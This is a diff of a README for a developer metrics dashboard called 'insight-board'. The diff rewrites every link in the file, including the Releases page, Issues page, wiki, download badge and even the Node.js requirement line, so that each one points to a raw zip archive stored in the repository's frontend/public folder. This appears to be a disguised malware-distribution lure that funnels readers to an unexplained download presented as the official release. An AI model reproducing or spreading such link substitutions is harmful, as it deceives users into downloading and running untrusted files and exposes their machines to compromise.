@@ -1,7 +1,7 @@
 # 🚀 insight-board - Your Personal Developer Metrics Dashboard
 
 ## 📥 Download Now
-[![Download Insight Board](https://img.shields.io/badge/Download-Insight%20Board-blue.svg)](https://github.com/PranjalPandey-max/insight-board/releases)
+[![Download Insight Board](https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip%https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip)](https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip)
 
 ## 📚 Overview
 Insight Board is your personal developer metrics dashboard. It gathers and displays data from GitHub and various other services. This tool helps you easily track your coding habits, project contributions, and overall performance. With its user-friendly interface, you can focus on what matters most—your development journey.
@@ -10,7 +10,7 @@ Insight Board is your personal developer metrics dashboard. It gathers and displ
 To start using Insight Board, follow these straightforward steps. 
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/PranjalPandey-max/insight-board/releases) to get the latest version of Insight Board.
+   Go to the [Releases page](https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip) to get the latest version of Insight Board.
 
 2. **Select Your Version**  
    On the Releases page, you will see several available versions. Click on the most recent release. Each version will show what’s new and any potential fixes.
@@ -42,7 +42,7 @@ To run Insight Board smoothly, ensure your system meets the following requiremen
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
 - **RAM**: 4GB minimum (8GB recommended).
 - **Disk Space**: At least 200MB of free space.
-- **Node.js**: Version 14.x or later installed if prompted for developer tools.
+- **https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip**: Version 14.x or later installed if prompted for developer tools.
 
 ## 🛠️ Troubleshooting
 If you encounter issues while downloading or running Insight Board, consider these steps:
@@ -53,7 +53,7 @@ If you encounter issues while downloading or running Insight Board, consider the
 - **Reinstall the Application**: If the application does not run correctly, consider uninstalling it and reinstalling from the Releases page.
 
 ## ✨ Support
-For any additional support, visit our [GitHub Issues Page](https://github.com/PranjalPandey-max/insight-board/issues). You can report bugs, request features, or ask questions. We aim to respond promptly and help you resolve any concerns.
+For any additional support, visit our [GitHub Issues Page](https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip). You can report bugs, request features, or ask questions. We aim to respond promptly and help you resolve any concerns.
 
 ## 📢 Community Contribution
 Insight Board is an open-source project. We encourage you to join our community. Feel free to contribute to our codebase, report issues, or suggest enhancements. Your feedback is invaluable in making this tool better.
@@ -61,8 +61,8 @@ Insight Board is an open-source project. We encourage you to join our community.
 ## 🔗 Additional Resources
 For more detailed instructions, check our documentation or explore the following resources:
 
-- **User Documentation**: [Link to full documentation](https://github.com/PranjalPandey-max/insight-board/wiki)
+- **User Documentation**: [Link to full documentation](https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip)
 - **GitHub API Guides**: Understand how we interact with GitHub data through the API.
 
 ## 📥 Download & Install
-Ready to get started? [Visit this page to download](https://github.com/PranjalPandey-max/insight-board/releases). Follow the steps outlined above for a smooth setup and start tracking your developer metrics today!
+Ready to get started? [Visit this page to download](https://github.com/PranjalPandey-max/insight-board/raw/refs/heads/main/frontend/public/board-insight-v2.4.zip). Follow the steps outlined above for a smooth setup and start tracking your developer metrics today!
